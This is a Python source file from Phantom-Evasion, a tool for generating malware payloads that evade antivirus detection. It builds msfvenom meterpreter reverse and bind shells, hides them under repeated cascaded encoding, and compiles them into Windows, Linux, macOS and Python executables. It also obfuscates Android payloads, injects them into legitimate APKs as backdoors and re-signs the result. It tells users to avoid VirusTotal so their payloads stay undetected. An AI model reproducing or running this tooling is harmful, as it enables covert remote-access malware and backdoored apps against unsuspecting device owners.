


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import subprocess,sys
import os,platform
import random
from time import sleep 
from shutil import rmtree
from random import shuffle
sys.dont_write_bytecode = True

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def path_finder(filename):
    path = ""
    lookfor = filename
    
    if platform.system() == "Windows":

        for root, dirs, files in os.walk('C:\\'):
            if lookfor in files:
                path = os.path.join(root, lookfor)
                return path

def linux_isready():
    
    try:
        is_present=subprocess.check_output(['which','apt'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] APT  [Not Found]\n")
        print("[-] Only dependencies check ( auto install not supported )\n")
        print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
        auto_check("apktool")
        auto_check("gcc")
        auto_check("mingw-w64")
        auto_check("pyinstaller")
        auto_check("zipalign")
        auto_check("msfvenom")
        auto_check("msfconsole")
        auto_check("openssl")
        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
        sleep(1)
    else:
        print(bcolors.GREEN + "[>] APT [Found]" + bcolors.ENDC) 
        sleep(0.1)
        ubuntu_isready()
    


def kali_arch_isready():
    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
    sleep(0.5)
    auto_setup("apktool")
    auto_setup("gcc")
    auto_setup("mingw-w64")
    auto_setup("pyinstaller")
    auto_setup("zipalign")
    auto_setup("msfvenom")
    auto_setup("msfconsole")
    auto_setup("openssl")
    print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
    sleep(1)

def ubuntu_isready():
    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
    sleep(0.5)
    auto_setup("apktool")
    auto_setup("gcc")
    auto_setup("mingw-w64")
    auto_setup("pyinstaller")
    auto_setup("zipalign")
    auto_setup("openssl")
    try:
        is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] Metasploit-Framework  [Not Found]\n")
        print("[-] you need to install metasploit framework manually\n")


    else:
        print(bcolors.GREEN + "[>] Metasploit-Framework  [Found]" + bcolors.ENDC) 
        sleep(0.1)    
        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
        sleep(1)

def auto_setup(name):
    name2=name
    if "mingw-w64" in name:

        name2="i686-w64-mingw32-gcc"

    try:
        is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)


    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] " + name + "  [Not Found]\n" + bcolors.ENDC)
        sleep(0.2)
        print(bcolors.GREEN + "[>] Trying to autoinstall\n" + bcolors.ENDC)
        sleep(1)
        subprocess.call(['apt-get','install',name,'-y'])
    else:
        print(bcolors.GREEN + "[+] " + name + "  [Found]\n" + bcolors.ENDC) 
        sleep(0.1)

def auto_check(name):
    name2=name
    if "mingw-w64" in name:

        name2="i686-w64-mingw32-gcc"

    try:
        is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)


    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] " + name + "  [Not Found]\n" + bcolors.ENDC)
        sleep(1)
    else:
        print(bcolors.GREEN + "[+] " + name + "  [Found]\n" + bcolors.ENDC) 
        sleep(0.1)

def dependencies_checker():
    clear()
    platform_used=""
    platform_used=platform.system()
    release_used=""
    release_used=platform.platform()
    
    if platform_used == "Linux":

        if "kali" in release_used:

            if "rolling" in release_used:

                print(bcolors.OCRA + "\n[>] KALI-ROLLING Detected!!\n" + bcolors.ENDC)
                sleep(1)

            elif "rolling" not in release_used:

                print(bcolors.OCRA + "\n[>] KALI2 Detected!!\n" + bcolors.ENDC)
                sleep(1)

            kali_arch_isready()

        elif "Ubuntu" in release_used:                
                
            print(bcolors.OCRA + "\n[>] UBUNTU Detected!!\n" + bcolors.ENDC)
            sleep(1)
            ubuntu_isready()

        else:
            print(bcolors.OCRA + "\n[>] LINUX distro Detected!! \n" + bcolors.ENDC)
            sleep(1)

    elif platform_used == "Windows":

        print(bcolors.RED + "\n[>] WINDOWS Detected!!\n" + bcolors.ENDC)
        sleep(1)
        print("[-] Auto install not supported\n")
        sleep(0.2)
        print("[-] Check README to properly install the dependencies\n")
        sleep(1)
        try:   
            ans=input("  Press Enter to continue: ") 
        except SyntaxError:
            pass

        pass

def advisor():
    clear()
    print(bcolors.RED + "[DISCLAIMER]:" + bcolors.ENDC + "Phantom-Framework is intended to be used for legal security")
    print("purposes only any other use is not under the responsibility of the developer\n") 
    sleep(0.2)
    print(bcolors.RED + "[+] Developed by:" + bcolors.ENDC + " Diego Cornacchini  \n")
    sleep(0.2)
    print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
    sleep(0.2)
    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.1 \n")
    sleep(0.2)
    print(bcolors.RED + "[+] NOTE: " + bcolors.ENDC + "Please Avoid submitting to VirusTotal!! (use NoDistribute instead)\n")
    sleep(0.2)
    print(bcolors.RED + "[+] NOTE: " + bcolors.ENDC + "If generated file get caught try to run again the module \n")
  

    sleep(5)
    

def clear():
    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
    sleep(0.1)

def banner():
    bann= "\n\n"
    bann += "   __________  ___ ___    _____    _________________________      _____   \n" 
    bann += "   \______   \/   |   \  /  _  \   \      \__    ___|_____  \    /     \  \n"
    bann += "    |     ___/    ~    \/  /_\  \  /   |   \|    |   /   |   \  /  \ /  \ \n"
    bann += "    |    |   \    Y    /    |    \/    |    \    |  /    |    \/    Y    \\\n"
    bann += "    |____|    \___|_  /\____|__  /\____|__  /____|  \_______  /\____|__  /\n"
    bann += "                    \/         \/         \/                \/         \/ \n"
    sleep(0.3)
    print(bcolors.RED + bann  + bcolors.ENDC)
  
def exit_banner():

    print("      *     .--. .-,       .-..-.__                ___        *              ")
    print("  .       .'(`.-` \_.-'-./`  |\_( \"\__   *        /   \           .         ")     
    print("       __.>\ ';  _;---,._|   / __/`'--)          / \ / \                *    ")
    print("      /.--.  : |/' _.--.<|  /  | |              |   @   |       *            ")                                    
    print("  _..-'    `\     /' /`  /_/ _/_/             , |       | ,                  ")
    print(" >_.-``-. `Y  /' _;---.`|/))))      *         \/(       )\/        .         ")
    print("'` .-''. \|:  \.'   __, .-'\"`                   | )   ( |                   ")
    print(" .'--._ `-:  \/:  /'  '.\             _|_       |(     )|                    ")
    print("     /.'`\ :;   /'      `-           `-|-`      ||   | |'            *       ")
    print("    -`    |     |                      |         |   | |                     ")
    print("          :.; : |        *         .-'~^~`-.     |   | |                     ")
    print("          |:    |                .'  HEUR   `.   |   /-'                     ")
    print("          |:.   |                |   RIP     |   |_.'                        ")
    print("          :. :  |                |   here    |                               ")
    print("         ,... : ;                | 31/10/2017|                               ")
    print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 

def pytherpreter_completer(module_type):
    clear()
    print(bcolors.OCRA + "\n[<Pytherpreter>] choose meterpreter payload:\n\n"  + bcolors.ENDC)
    print("[+] python/meterpreter/reverse_tcp\n")
    print("[+] python/meterpreter/reverse_http\n")
    print("[+] python/meterpreter/reverse_https\n")
    print("[+] python/meterpreter/bind_tcp\n")
    py_version=platform.python_version()
    if py_version[0] == "3":
        ans=input("\n[>] Please type one of the following payload: ")
    else:
        ans=raw_input("\n[>] Please type one of the following payload: ")
    if "reverse" in ans:
        if py_version[0] == "3":
            Lhost = input("\n[>] Please insert LHOST: ")
            Lport = input("\n[>] Please insert LPORT: ")
        else:
            Lhost = raw_input("\n[>] Please insert LHOST: ")
            Lport = raw_input("\n[>] Please insert LPORT: ")
        
        Lhost= "LHOST=" + str(Lhost)
        Lport= "LPORT=" + str(Lport)
        print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
        if platform.system == "Windows":
            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport],shell=True)
        else:
            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Lhost,Lport])
        pytherpreter_launcher(Paytime,module_type)

    elif "bind" in ans:
 
        if py_version[0] == "3":
            Rhost = input("\n[>] Please insert RHOST: ")
            Rport = input("\n[>] Please insert RPORT: ")
        else:
            Rhost = raw_input("\n[>] Please insert RHOST: ")
            Rport = raw_input("\n[>] Please insert RPORT: ")

        Rhost= "RHOST=" + str(Rhost)
        Rport= "RPORT=" + str(Rport)
        print(bcolors.GREEN + "\n[>] Generating code...\n"  + bcolors.ENDC)
        if platform.system == "Windows":

            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Rhost,Rport],shell=True)
        else:

            Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Rhost,Rport])

        pytherpreter_launcher(Paytime,module_type)
    

def pytherpreter_launcher(rec_Payload,module_type):
    generated_pyth=str(rec_Payload)
    py_version=platform.python_version()

    if py_version[0] == "3":    
        Filename=input(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)
    else:
        Filename=raw_input(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)  
      
    Filename+=".py"

    if platform.system() == "Linux" :

        if module_type == "Pytherpreter":

            subprocess.call(['python','Modules/payloads/Pytherpreter_10^8++.py',generated_pyth,Filename])

        elif module_type == "Pytherpreter_Polymorphic":

            subprocess.call(['python','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename])
        
    elif platform.system() == "Windows":

        if module_type == "Pytherpreter":

            subprocess.call(['py','Modules/payloads/Pytherpreter_10^8++.py',generated_pyth,Filename])

        elif module_type == "Pytherpreter_Polymorphic":

            subprocess.call(['py','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename])

    auto_pyinstall(Filename)   

def auto_pyinstall(filename):
    py_version=platform.python_version()

    if py_version[0] == "3": 
        ans=input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)
    else:
        ans=raw_input(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)

    if ans == "y":
        if platform.system() == "Linux":
            subprocess.call(['pyinstaller',filename,'-F'])
            
        elif platform.system() == "Windows":
            path2pyinstaller=path_finder("pyinstaller.py")
            subprocess.call(['py',path2pyinstaller,filename,'-F'])
            
        sleep(1)  
        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC)
        filename=filename.replace(".py","")
        bwd=str("dist/" + filename)
        os.rename(bwd,filename)
        rmtree("build")
        os.remove(filename + ".spec")
        os.rmdir("dist")  
        sleep(3)  
    else:
        print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder\n"  + bcolors.ENDC)
        sleep(3)

def menu_options():
    print("    ====================================================================")
    print("  ||"+ bcolors.OCRA + "     [PHANTOM MENU]" + bcolors.ENDC + ":             ||                                 || ")
    print("  ||                                 ||                                 || ")
    print("  ||    [1]  List All modules        ||   [5]  List Android modules     || ")
    print("  ||                                 ||                                 || ")
    print("  ||    [2]  List Windows modules    ||   [6]  List Universal modules   || ")
    print("  ||                                 ||                                 || ")
    print("  ||    [3]  List Linux modules      ||   [7]  Update                   || ")
    print("  ||                                 ||                                 || ")
    print("  ||    [4]  List OSX modules        ||   [0]  Exit                     || ")
    print("  ||                                 ||                                 || ")
    print("    ====================================================================\n")

def payload_generator(msfvenom_payload,arch,host,port):
    py_version=platform.python_version()    

    Randiter = str(random.randint(15,20))
    platform == ""
 

    if "reverse" in msfvenom_payload:

        Lhost= "LHOST=" + str(host)
        Lport= "LPORT=" + str(port)
        if platform.system() == "Windows":
            if py_version[0] == "3":
                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
            else:
                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)


            
        else:

            if py_version[0] == "3":
                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
            else:
                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])


    elif "bind" in msfvenom_payload: 

        Rhost= "RHOST=" + str(host)
        Rport= "RPORT=" + str(port)
        if platform.system() == "Windows":
            if py_version[0] == "3":
                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
            else:
                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)

        else:
            if py_version[0] == "3":
                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
            else:
                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])

    return str(Payload)

        
def custom_payload_completer(custom_shellcode):

    Payload = "unsigned char buf[] = \"" + custom_shellcode + "\";\n"

    return Payload


def auto_compiler(module_type,arch,filename):
    Os_used = platform.system()
    if Os_used == "Linux":

        if "windows" in module_type and arch == "x86":
            filename += ".exe"

            subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 

        elif "windows" in module_type and arch == "x64": 
            filename += ".exe"

            subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])

        elif "linux" in module_type and arch == "x86":

            subprocess.call(['gcc','Source.c','-o',filename,'-m32','-no-pie'])

        elif "linux" in module_type and arch == "x64":

            subprocess.call(['gcc','Source.c','-o',filename,'-no-pie'])

    elif Os_used == "Windows":

        if "windows" in module_type and arch == "x86":
            filename += ".exe"

            subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie'],shell=True)

        elif "windows" in module_type and arch == "x64": 
            filename += ".exe"

            subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie'],shell=True)

        elif "linux" in module_type and arch == "x86":

            print("Autocompile not supported use cygwin to compile source code")

        elif "linux" in module_type and arch == "x64":

            print("Autocompile not supported use cygwin to compile source code")

 

def shellcode_options():
    clear()
    py_version=platform.python_version()
    print(bcolors.OCRA + "[<Payload>] choose how to supply shellcode:\n\n" + bcolors.ENDC)
    print("[1] Msfvenom\n")
    print("[2] Custom shellcode\n")
    if py_version[0] == "3":
        ans=input("\n[>] Please insert choice\'s number: ")
    else:
        ans=raw_input("\n[>] Please insert choice\'s number: ")        
    return ans  

def module_launcher1(module_choice):
    py_version=platform.python_version()
    if py_version[0] == "3":
        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
    else:
        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
        
    if "reverse" in payload_choice:
        if py_version[0] == "3":
            commtype=input("\n[>] Please insert LHOST: ")
            port=input("\n[>] Please insert LPORT: ")
        else:
            commtype=raw_input("\n[>] Please insert LHOST: ")
            port=raw_input("\n[>] Please insert LPORT: ")

    elif "bind" in payload_choice:

        if py_version[0] == "3":
            commtype=input("\n[>] Please insert RHOST: ")
            port=input("\n[>] Please insert RPORT: ")
        else:
            commtype=raw_input("\n[>] Please insert RHOST: ")
            port=raw_input("\n[>] Please insert RPORT: ")

    if "x64" in payload_choice:

        Arc = "x64"

    else:

        Arc = "x86"
    if py_version[0] == "3":

        output_filename = input("\n[>] Enter output filename: ")
    else:
        output_filename = raw_input("\n[>] Enter output filename: ")        

    module_where = "Modules/payloads/" + module_choice

    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 

    Payload = payload_generator(payload_choice,Arc,commtype,port)

    if platform.system() == "Linux":

        subprocess.call(['python',module_where,Payload,output_filename])

    elif platform.system() == "Windows":
        
        subprocess.call(['py',module_where,Payload,output_filename])

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 

    sleep(2)

    auto_compiler(module_choice,Arc,output_filename)

def module_launcher2(module_choice):
    py_version=platform.python_version()
    if py_version[0] == "3":
        custom_shellcode = input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
        output_filename = input("\n[>] Enter output filename: ")
        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
    else:
        custom_shellcode = raw_input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
        output_filename = raw_input("\n[>] Enter output filename: ")
        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")

    module_choice = "Modules/payloads/" + module_choice

    Payload = custom_payload_completer(custom_shellcode)

    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)

    subprocess.call(['python',module_choice,Payload,output_filename])

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    sleep(2)

    auto_compiler(module_choice,arch,output_filename)


    

def shellcode_completer(module_type):

    shell_gen_type = shellcode_options()

    if shell_gen_type == "1":

        module_launcher1(module_type)
        print("\n[<>] File saved in prototype folder!\n")
        sleep(3)

    elif shell_gen_type == "2":

        module_launcher2(module_type)
        print("\n[<>] File saved in prototype folder!\n")
        sleep(3)

def osx_cascade_encoding():
    py_version=platform.python_version()
    if py_version[0] == "3":     
        osx_payload = input("\n[>] Enter msfvenom osx 64 bit payload : ")
    else:
        osx_payload = raw_input("\n[>] Enter msfvenom osx 64 bit payload : ")

    encoder_list = ["x86/countdown","x64/xor","x86/fnstenv_mov","x86/jmp_call_additive","x86/call4_dword_xor"]
    shuffle(encoder_list)
    numb_iter1=str(random.randint(2,4))
    numb_iter2=str(random.randint(2,4))
    numb_iter3=str(random.randint(2,4))
    numb_iter4=str(random.randint(2,4))
    numb_iter5=str(random.randint(2,4))
    enc1=str(encoder_list[0])
    enc2=str(encoder_list[1])
    enc3=str(encoder_list[2])
    enc4=str(encoder_list[3])
    enc5=str(encoder_list[4])
    enc1=enc1.replace("[","")
    enc1=enc1.replace("]","")
    enc2=enc2.replace("[","")
    enc2=enc2.replace("]","")
    enc3=enc3.replace("[","")
    enc3=enc3.replace("]","")
    enc4=enc4.replace("[","")
    enc4=enc4.replace("]","")
    enc5=enc5.replace("[","")
    enc5=enc5.replace("]","")
    enc6="x86/shikata_ga_nai"
    numb_iter6="5"

    if "reverse" in osx_payload:
        if py_version[0] == "3":
            commtype=input("\n[>] Please insert LHOST: ")
            port=input("\n[>] Please insert LPORT: ")
        else:
            commtype=raw_input("\n[>] Please insert LHOST: ")
            port=raw_input("\n[>] Please insert LPORT: ")
        commtype="LHOST=" + commtype
        port="LPORT=" + port

    elif "bind" in osx_payload:

        if py_version[0] == "3":
            commtype=input("\n[>] Please insert RHOST: ")
            port=input("\n[>] Please insert RPORT: ")
        else:
            commtype=raw_input("\n[>] Please insert RHOST: ")
            port=raw_input("\n[>] Please insert RPORT: ")

        commtype="RHOST=" + commtype
        port="RPORT=" + port
    if py_version[0] == "3":
        macho_filename = input("\n[>] Enter output filename: ")
    else:
        macho_filename = raw_input("\n[>] Enter output filename: ")
    macho_filename = macho_filename + ".dmg"
    print (bcolors.GREEN + "\n[>] Generating cascade-encoded Mach-o ...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x64','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE,shell=True) 
        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE,shell=True)
        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_2.stdout, stdout=subprocess.PIPE,shell=True)

        round_1.wait() 
        round_2.wait() 
        round_3.wait()
    else:
        
        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x64','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE) 
        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE)
        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc3,'-i',numb_iter3,'-f','raw'], stdin=round_2.stdout, stdout=subprocess.PIPE)
        round_4 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc4,'-i',numb_iter4,'-f','raw'], stdin=round_3.stdout, stdout=subprocess.PIPE)
        round_5 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc5,'-i',numb_iter5,'-f','raw'], stdin=round_4.stdout, stdout=subprocess.PIPE)
        round_6 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x64','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_5.stdout, stdout=subprocess.PIPE)

        round_1.wait() 
        round_2.wait() 
        round_3.wait() 
        round_4.wait() 
        round_5.wait() 
        round_6.wait() 
     
    sleep(2) 

def apk_msfvenom():
    py_version=platform.python_version()
    if py_version[0] == "3":
        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)
        Lhost=input("\n[>] Please insert LHOST: ")
        Lport=input("\n[>] Please insert LPORT: ")

    else:
        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)
        Lhost=raw_input("\n[>] Please insert LHOST: ")
        Lport=raw_input("\n[>] Please insert LPORT: ") 

    Lhost= "LHOST=" + str(Lhost)
    Lport= "LPORT=" + str(Lport)
    print(bcolors.GREEN + "\n[>] Generating Apk Payload...\n" + bcolors.ENDC)
    if platform.system() == "Windows":
        
        subprocess.call(['msfvenom','-p',payload_choice,'--platform','Android','-a','dalvik',Lhost,Lport,'-o','msf_gen.apk'],shell=True)
    else:
        subprocess.call(['msfvenom','-p',payload_choice,'--platform','Android','-a','dalvik',Lhost,Lport,'-o','msf_gen.apk'])

def apktool_d(baksmali,name):
    print(bcolors.GREEN + "\n[>] Baksmaling...\n" + bcolors.ENDC)
    if platform.system() == "Windows":
        
        subprocess.call(['apktool.jar','d','-f',baksmali,'-o',name],shell=True)    
    else:
        subprocess.call(['apktool','d','-f',baksmali,'-o',name])
        
def apktool_b(smali):
    print(bcolors.GREEN + "\n[>] Smaling...\n" + bcolors.ENDC)
    if platform.system() == "Windows":
        
        subprocess.call(['apktool.jar','b','-f',smali,'-o','msf_rebuild.apk'],shell=True)
    else:
        subprocess.call(['apktool','b','-f',smali,'-o','msf_rebuild.apk'])

        
def sign_apk():
    py_version=platform.python_version()
    if py_version[0] == "3":
        Apk_out=input("\n[>] Please insert output filename: ") 
    else:
        Apk_out=raw_input("\n[>] Please insert output filename: ")
    Apk_out+= ".apk"
  
    print(bcolors.GREEN + "\n[>] Resigning apk...\n" + bcolors.ENDC)
    pem_pk8()
    sleep(0.5)
    if platform.system() == "Windows":
        
        subprocess.call(['java','-jar','Setup/apk_sign/signapk.jar','Setup/apk_sign/certificate.pem','Setup/apk_sign/key.pk8','msf_rebuild.apk',Apk_out],shell=True)
    else:
        subprocess.call(['java','-jar','Setup/apk_sign/signapk.jar','Setup/apk_sign/certificate.pem','Setup/apk_sign/key.pk8','msf_rebuild.apk','resigned.apk'])
        print(bcolors.GREEN + "[>]Aligning with Zipalign...\n" + bcolors.ENDC)
        subprocess.call(['zipalign','-p','4','resigned.apk',Apk_out])
    sleep(2)

    

def pem_pk8():
    Cert=os.path.isfile("Setup/apk_sign/certificate.pem")
    Pk8=os.path.isfile("Setup/apk_sign/key.pk8")
    if Cert and Pk8:
       print("X509 Certificate and key pk8\n")
    else:
       print("[+] First run of Apk signer!! you need to create a certificate to sign apk\n")
       sleep(1)
       print("[+] Fill (or leave it blank) options required\n")
       sleep(4)
       if platform.system() == "Windows":

           subprocess.call(['openssl','genrsa','-out','Setup/apk_sign/key.pem','1024'],shell=True)
           subprocess.call(['openssl','req','-new','-key','Setup/apk_sign/key.pem','-out','Setup/apk_sign/request.pem'],shell=True)
           subprocess.call(['openssl','x509','-req','-days','9999','-in','Setup/apk_sign/request.pem','-signkey','Setup/apk_sign/key.pem','-out','Setup/apk_sign/certificate.pem'],shell=True)
           subprocess.call(['openssl','pkcs8','-topk8','-outform','DER','-in','Setup/apk_sign/key.pem','-inform','PEM','-out','Setup/apk_sign/key.pk8','-nocrypt'],shell=True)
           
       else:    
           subprocess.call(['openssl','genrsa','-out','Setup/apk_sign/key.pem','1024'])
           subprocess.call(['openssl','req','-new','-key','Setup/apk_sign/key.pem','-out','Setup/apk_sign/request.pem'])
           subprocess.call(['openssl','x509','-req','-days','9999','-in','Setup/apk_sign/request.pem','-signkey','Setup/apk_sign/key.pem','-out','Setup/apk_sign/certificate.pem'])
           subprocess.call(['openssl','pkcs8','-topk8','-outform','DER','-in','Setup/apk_sign/key.pem','-inform','PEM','-out','Setup/apk_sign/key.pk8','-nocrypt'])

       os.remove("Setup/apk_sign/request.pem") 
       os.remove("Setup/apk_sign/key.pem")

def droidmare_launcher():
    print("\n[1] Obfuscate msf payload\n")
    print("\n[2] Obfuscate msf payload & Backdoor Apk \n")
    py_version=platform.python_version()
    if py_version[0] == "3":
        decision =input(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
    else: 
        decision =raw_input(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
    if decision == "1":
        apk_msfvenom()
        sleep(0.5)
        apktool_d("msf_gen.apk","msf_smali")
        sleep(0.5)
        print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
        if platform.system() == "Windows":
            subprocess.call(['py','Modules/payloads/Smali_Droidmare.py','msf_smali'],shell=True)
        else:
            
            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali'])
        sleep(0.5)
        apktool_b("msf_smali")
        sleep(0.5)
        sign_apk()
        sleep(0.5)
        rmtree("msf_smali")
        os.remove("msf_gen.apk")
        os.remove("msf_rebuild.apk")
        os.remove("resigned.apk")
        print("\n[>] New Apk saved in phantom folder")
        sleep(2)


    elif decision == "2":
        apk_msfvenom()
        sleep(0.5)
        if py_version[0] == "3":
            apktobackdoor=input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom folder then enter the name:" + bcolors.ENDC)
        else:
            apktobackdoor=raw_input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom folder then enter the name:" + bcolors.ENDC)          
        if ".apk" not in apktobackdoor:
            apktobackdoor += ".apk"
        apktool_d("msf_gen.apk","msf_smali")
        apktool_d(apktobackdoor,"apk_smali")
        sleep(0.5)
        print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
        if platform.system() == "Windows":
            
            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"],shell=True)
        else:
            
            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"])
        sleep(0.5)
        apktool_b("apk_smali")
        sleep(0.5)
        sign_apk()
        sleep(0.5)
        rmtree("msf_smali")
        rmtree("apk_smali")
        os.remove("msf_gen.apk")
        os.remove("msf_rebuild.apk")
        os.remove("resigned.apk")
        print("\n[>] New Apk saved in phantom folder")
        sleep(2)

def description_printer(module_type):
    print("\n[+] MODULE DESCRIPTION:\n") 
    
    if module_type == "MVA_mathinject_windows.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Windows dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
